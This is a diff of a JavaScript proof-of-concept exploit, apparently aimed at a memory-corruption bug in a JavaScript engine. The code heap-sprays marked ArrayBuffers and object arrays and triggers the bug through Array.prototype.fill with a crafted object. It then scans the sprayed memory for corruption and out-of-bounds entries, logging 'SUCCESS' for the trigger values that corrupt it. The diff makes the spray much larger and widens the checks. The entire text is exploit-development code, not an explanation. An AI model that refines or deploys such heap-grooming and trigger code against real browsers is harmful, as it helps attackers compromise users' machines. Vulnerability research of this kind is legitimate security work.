@@ -2,30 +2,50 @@ import { log, sleep } from './module/utils.mjs';
 
 const MARK = 0x42424242;
 
-function allocSpray(leftCount, rightCount) {
-    const left = [];
-    const right = [];
-    for (let i = 0; i < leftCount; i++) {
-        const b = new ArrayBuffer(0x4000);
-        const v = new Uint32Array(b);
-        v[0] = MARK;
-        v[1] = 0x11111111;
-        left.push(b);
+function massiveSpray() {
+    const objects = [];
+    
+    for (let i = 0; i < 1000; i++) {
+        const buffer = new ArrayBuffer(0x4000);
+        const view = new Uint32Array(buffer);
+        view[0] = MARK;
+        view[1] = i;
+        objects.push(buffer);
     }
-    for (let i = 0; i < rightCount; i++) {
-        const b = new ArrayBuffer(0x4000);
-        const v = new Uint32Array(b);
-        v[0] = 0x99999999;
-        v[1] = MARK;
-        right.push(b);
+    
+    for (let i = 0; i < 1000; i++) {
+        const arr = new Array(100);
+        for (let j = 0; j < arr.length; j++) {
+            arr[j] = {
+                marker: MARK,
+                index: i,
+                data: new ArrayBuffer(64)
+            };
+        }
+        objects.push(arr);
     }
-    return { left, right };
+    
+    for (let i = 0; i < 1000; i++) {
+        const typed = new Uint8Array(0x2000);
+        typed[0] = 0x42;
+        typed[1] = 0x42;
+        typed[2] = 0x42;
+        typed[3] = 0x42;
+        objects.push(typed.buffer);
+    }
+    
+    return objects;
 }
 
 function trigger(returnVal) {
     const v0 = [];
-    for (let i = 0; i < 2000; i++) {
-        v0[i] = { tag: 0xdead, idx: i, buf: new ArrayBuffer(32) };
+    for (let i = 0; i < 50000; i++) {
+        v0[i] = {
+            tag: 0xdead,
+            idx: i,
+            buf: new ArrayBuffer(48),
+            arr: [1, 2, 3, 4, 5]
+        };
     }
     const v10 = new Object(Object, v0);
 
@@ -37,45 +57,59 @@ function trigger(returnVal) {
 
     try {
         v0.fill(v10, o14);
-        log("fill completed (no crash)");
+        log("fill completed");
     } catch (e) {
-        log("fill threw:" + e && e.message);
+        log("fill threw:" + e);
     }
 
     return { v0, v10 };
 }
 
-function check(left, right) {
+function check(sprayedObjects) {
     let corrupted = 0;
-    for (let i = 0; i < left.length; i++) {
-        const v = new Uint32Array(left[i]);
-        if (v[0] !== MARK || v[1] !== 0x11111111) {
-            log("Left block corrupted at" + i + v[0] + v[1]);
-            corrupted++;
+    
+    for (let i = 0; i < sprayedObjects.length; i++) {
+        const obj = sprayedObjects[i];
+        
+        if (obj instanceof ArrayBuffer) {
+            const view = new Uint32Array(obj);
+            if (view[0] !== MARK && view[0] !== 0) {
+                log("Buffer corrupted at " + i + " value " + view[0].toString(16));
+                corrupted++;
+            }
+        }
+        
+        else if (Array.isArray(obj)) {
+            for (let j = obj.length; j < obj.length + 20; j++) {
+                if (obj[j] !== undefined && obj[j].marker === MARK) {
+                    log("Array OOB at " + i + " index " + j);
+                    corrupted++;
+                }
+            }
         }
     }
-    for (let i = 0; i < right.length; i++) {
-        const v = new Uint32Array(right[i]);
-        if (v[0] !== 0x99999999 || v[1] !== MARK) {
-            log("Right block corrupted at" + i + v[0] + v[1]);
-            corrupted++;
-        }
-    }
+    
     return corrupted;
 }
 
 async function main() {
-    const values = [-889, -1000, -500, -100, -10, 0, 10, 100, 500, 1000];
+    const values = [-889, -1000, -100, 0, 100, 1000];
     
     for (const returnValue of values) {
-        log("Testing return value:" + returnValue);
-        const { left, right } = allocSpray(50, 50);
-        const tmp = [];
-        for (let i = 0; i < 300; i++) tmp.push(new ArrayBuffer(0x1000));
-
+        log("Testing value: " + returnValue);
+        
+        const sprayedObjects = massiveSpray();
+        await sleep(50);
+        
         trigger(returnValue);
-        const corrupted = check(left, right);
-        log("Corrupted blocks:" + corrupted);
+        await sleep(20);
+        
+        const corrupted = check(sprayedObjects);
+        log("Corrupted: " + corrupted);
+        
+        if (corrupted > 0) {
+            log("SUCCESS with value: " + returnValue);
+        }
         
         await sleep(100);
         log("---");
